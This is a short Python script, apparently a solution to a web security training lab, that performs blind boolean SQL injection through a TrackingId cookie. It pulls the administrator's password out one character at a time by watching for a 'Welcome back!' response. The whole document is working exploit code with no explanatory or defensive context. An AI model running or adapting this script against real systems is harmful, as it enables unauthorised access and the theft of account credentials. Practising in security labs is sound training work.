import requests
import string

url = "https://0a10003803f349cf80be26a5007c00d1.web-security-academy.net/login"

tracking_id = "7Itm5DEgpF70MXu9"
session = "3mQEAdAHV0kDtdwEARtu43bCdwniet64"

chars = string.ascii_lowercase + string.digits
password = ""

for position in range(1, 31):
    for char in chars:
        cookies = {
            "TrackingId": f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--",
            "session": session
        }

        response = requests.get(url, cookies=cookies)

        if "Welcome back!" in response.text:
            password += char
            print(f"[+] {position}: {char} -> {password}")
            break

print(f"\nPassword: {password}")
